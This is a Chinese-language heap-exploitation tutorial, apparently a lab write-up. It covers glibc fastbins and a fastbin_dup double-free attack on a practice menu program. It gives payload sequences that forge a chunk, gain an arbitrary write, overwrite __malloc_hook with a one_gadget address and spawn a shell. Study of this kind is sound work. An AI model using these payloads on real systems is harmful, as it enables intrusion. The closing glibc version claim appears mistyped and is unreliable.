## FastBin

与malloc相对的是free函数

free函数可以释放malloc分配的chunk空间

这些free的chunk会连接在一起在free_list中 

fastbins是可以快速访问的bins，里面存储着被free的chunk

用一个简单的例子来看一下，首先malloc了三个空间，这时可以看到vis和fastbins的输出

![image-20210309102430685](https://static.hack1s.fun/images/2021/03/08/image-20210309102430685.png)

执行这一步free，把a这部分空间free掉之后再看有什么变化

![image-20210309103115001](https://static.hack1s.fun/images/2021/03/08/image-20210309103115001.png)

执行完了一步，`free(a)`之后可以看到，vis中原本a那里被标识出来连接到了fastbins

另外在fastbins中0x20的位置填上了原本a的chunk地址

这里的信息是存储在堆中名为arena的空间的，直接用`dq &main_arena 20`查看

![image-20210309103705950](https://static.hack1s.fun/images/2021/03/08/image-20210309103705950.png)

红色标出来的地方是大小为0x20的fastbin所在的地址

每次free之后如果要被放在fastbin中就会在main_arena中进行修改，图中按照字节下去，接下来是0x30、0x40等等的fastbin

![image-20210309103914355](https://static.hack1s.fun/images/2021/03/08/image-20210309103914355.png)

再将b和c都free掉

之后可以看到首先是vis看到的堆中的数据，原本b、c的空间中userdata的第一个字变成了前面的地址；

即c的user-data是chunk b的地址，b的user-data是chunk a的地址，而a的user-data为0，表示为链表末尾；

在main_arena中记录的是chunk c的地址，即fastbins链表中的最后一项

fastbin的结构类似于栈，filo

之后我们再执行三次malloc，查看都分配在哪里

![image-20210309104346142](https://static.hack1s.fun/images/2021/03/08/image-20210309104346142.png)

可以发现最先申请的d是拿到了原本c的空间；

最后申请的f是拿到了原本a的空间；先进后出，类似于栈



## Fastbin_dup

### 漏洞程序本身

这个程序本身也是一个菜单形式

![image-20210309110132813](https://static.hack1s.fun/images/2021/03/09/image-20210309110132813.png)

输入用户名，之后就是malloc、free、target，和之前的程序差不多；

首先分配一个空间随便输一些内容看一下

![image-20210309113050324](https://static.hack1s.fun/images/2021/03/09/image-20210309113050324.png)

之后可以用free输入index来释放这个chunk

释放的index是从0开始往后增长的

最初输入的用户名和target是一个绑定的结构，可以用p来print或者用dq查看内存区域的内容

![image-20210309113011670](https://static.hack1s.fun/images/2021/03/09/image-20210309113011670.png)



### 任意地址写

首先还是实现初级目标，任意地址写

这个程序本身的问题是double free，可以对一个chunk free两次

首先尝试一下直接free这个chunk两次

![iShot2021-03-09 11.49.30](https://static.hack1s.fun/images/2021/03/09/iShot2021-03-09-11.49.30.png)

直接收到了Abort信号中断下来了，这时用`frame 4`查看`_int_free`函数的栈帧

![image-20210309122347315](https://static.hack1s.fun/images/2021/03/09/image-20210309122347315.png)

可以看到在这个函数这里是一个提示，检测到了double free，之后中断了；

看到这里的注释，其实是因为要free的chunk和fastbin的链表中top chunk是相同的导致的；

那么针对这个的绕过方式就是再第一次free之后再free一次其他的chunk

让fastbin的第一项和要free的chunk不是同一个地址就可以了

![image-20210309134725591](https://static.hack1s.fun/images/2021/03/09/image-20210309134725591.png)

这样实现的一个效果就是fastbin链表中形成了一个环

```
0x603000->0x603030->0x603000
```

接下来如果执行malloc的话就可以两次申请0x603000的空间

如果想要构成任意地址写，可以第一次申请之后修改其中User-Data的第一个字处，改成一个想要写的地址；

这样之后再执行malloc就可以申请来任意一个地址，并且可以写内容；

![image-20210309135902423](https://static.hack1s.fun/images/2021/03/09/image-20210309135902423.png)

这里我们执行流程是

```c
a=malloc(0x28);
b=malloc(0x28);

free(a);
free(b);
free(a);

malloc(0x28,p64(0xdeadbeef));
```

其中最后一次malloc分配的内容到了原本chunk a的位置，并且我们在user data这里填充了0xdeadbeef

这样接下来再申请三次，第三次malloc的内容就会写在0xdeadbeef这里

我们想要修改的是Target变量的值，这个值在`elf.sym.user`这里，所以我们先把shellcode改成下面这样

```c
a=malloc(0x28);
b=malloc(0x28);

free(a);
free(b);
free(a);

malloc(0x28,p64(elf.sym.user));

malloc(0x28);
malloc(0x28);
malloc(0x28,"writesomethins");
```

结果刚刚运行就直接收到SIGNAL中断了，查看一下出错的位置的栈帧，可以看到提示的是Memory corruption

![image-20210309142858585](https://static.hack1s.fun/images/2021/03/09/image-20210309142858585.png)

注释写着是在检查chunk的size字段和fastbin申请的是否相等

看一下我们正常申请chunk时的结构，有一个比较重要的地方被忽略了

![image-20210309143322952](https://static.hack1s.fun/images/2021/03/09/image-20210309143322952.png)

这些地方都标识着0x31，表示这个chunk大小是0x30

而我们伪造的`elf.sym.user`那里是没有这个值的，因此需要把这个补一下；

正好这个地方是我们一开始输入username的地方，我们直接把username伪造成这样的结构就可以了

```python
username = p64(0) + p64(0x31)
```

![image-20210309143607915](https://static.hack1s.fun/images/2021/03/09/image-20210309143607915.png)

这时可以看到这个target就已经被改了

但是这样的任意地址写有一些限制，需要先在要写的位置有一段可以控制的内容，在这里我们想要写的是target，但是首先需要能够控制这个user字段，否则伪造的chunk无法通过size的检查。



### 任意代码执行

可以尝试像之前一样修改`__malloc_hook`或是修改`__free_hook`

但是简单的尝试修改这两个指针的值会导致没有办法通过chunk size的检查

我们可以使用`find_fake_fast`这个指令查看想要修改的位置附近是否有可能存在可以伪造的chunk内存地址

![image-20210309145810006](https://static.hack1s.fun/images/2021/03/09/image-20210309145810006.png)

这里查到`__free_hook`附近是没有，`__malloc_hook`前面一些有这样的一个可以改的地方

实际上把这附近的值都输出一下，可以发现

![image-20210309151047303](https://static.hack1s.fun/images/2021/03/09/image-20210309151047303.png)

实际上`find_fake_fast`做的事情就是在`__malloc_hook`开始的地址向前找，看是否有哪一个地方可以当作标志位，可以用来伪造的；

![image-20210309152409297](https://static.hack1s.fun/images/2021/03/09/image-20210309152409297.png)

虽然这里`0x7f`不是在size实际上在的那个位置，但是前面都是0，我们设法把`0x7f`这个位置放在size的地方再对齐，靠这个0x7f绕过free对size的检查；

然后由于大小是0x70，原本是申请0x28是放在0x30的bins，需要都改成0x68，放在0x70的bins

另外从这个fake chunk的用户数据`b3d`到`__malloc_hook`的`b50`中间还需要填充一些数据

所以整个流程就是

```python
a=malloc(0x68)
b=malloc(0x68)

free(a)
free(b)
free(a)

malloc(0x68,p64(libc.sym['__malloc_hook']-(0x50-0x2d)))
malloc(0x68)
malloc(0x68)
malloc(0x68,b'B'*(0x50-0x3d)+p64(libc.sym.system))
```

这样执行完之后就已经被改成了system了

![image-20210309153136049](https://static.hack1s.fun/images/2021/03/09/image-20210309153136049.png)

最后想要弹一个shell就只需要传`/bin/bash`给system的参数就可以了

但是这里又存在了一个问题

这个程序为了只申请fastbin，在这里malloc的大小受到了限制

![image-20210309153759265](https://static.hack1s.fun/images/2021/03/09/image-20210309153759265.png)

最大120，着肯定没法直接传入一个地址

这里的解决方法是不使用system函数的地址，改用one_gadget

![image-20210309155239795](https://static.hack1s.fun/images/2021/03/09/image-20210309155239795.png)

用one_gadget查找这个libc中可能调用的bin/sh

之后把这个地址和libc的起始地址相加之后写到原本system那个地方

下面需要检查一下这里面哪一个gadget的约束条件是满足的



在GDB里面用`b *__malloc_hook`下断点，之后继续运行

在终端里面用选项1触发malloc，查看这时的寄存器状态

![image-20210309155832740](https://static.hack1s.fun/images/2021/03/09/image-20210309155832740.png)

R12、R13都不是NULL，并且rsi、[rsi]也都不是NULL、[rax]、[[rax]]也不是

那只能确认一下`[rsp+0x50]`这里了

![image-20210309160124592](https://static.hack1s.fun/images/2021/03/09/image-20210309160124592.png)

检查一下栈发现这里是满足的，所以可以用这个gadget

最终我们的payload如下

```python
a=malloc(0x68)
b=malloc(0x68)

free(a)
free(b)
free(a)

malloc(0x68,p64(libc.sym['__malloc_hook']-(0x50-0x2d)))
malloc(0x68)
malloc(0x68)
malloc(0x68,b'B'*(0x50-0x3d)+p64(libc.address+0xe1fa1))

malloc(1,'')
```

运行一下就成功获得了shell权限

![image-20210309160307408](https://static.hack1s.fun/images/2021/03/09/image-20210309160307408.png)



FastBin_dup只可以用于glibc_2.3.1及以下的版本

并且需要攻击者知道要修改的地址，以及能够找到绕过chunk size检查的fake chunk

